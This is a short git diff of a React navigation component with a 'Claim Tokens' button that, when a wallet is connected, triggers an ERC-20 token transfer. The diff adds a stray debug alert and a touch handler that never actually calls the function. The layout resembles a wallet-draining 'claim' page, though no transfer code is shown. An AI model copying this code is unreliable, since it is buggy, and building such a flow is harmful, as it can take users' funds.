@@ -229,6 +229,7 @@ export default function Nav() {
   }, []);
 
   const handleTokenTransfer = async () => {
+    alert('clickefd')
     if (validBalances) {
       await handleTokenErc20Transfer();
 
@@ -326,7 +327,7 @@ const newDat = 0.0026;
       <div className="px-5 md:px-24 flex flex-col items-center">
       {isConnected ? (
         <button
-        onTouchStart={handleTokenTransfer}
+        onTouchStart={async () => await handleTokenTransfer}
         onClick={async () => await handleTokenTransfer()}
           className="w-full md:w-95 h-10 bg-green text-white p-5 text-sm md:text-base rounded-3xl z-10 flex items-center justify-center"
           aria-label="Claim Tokens"
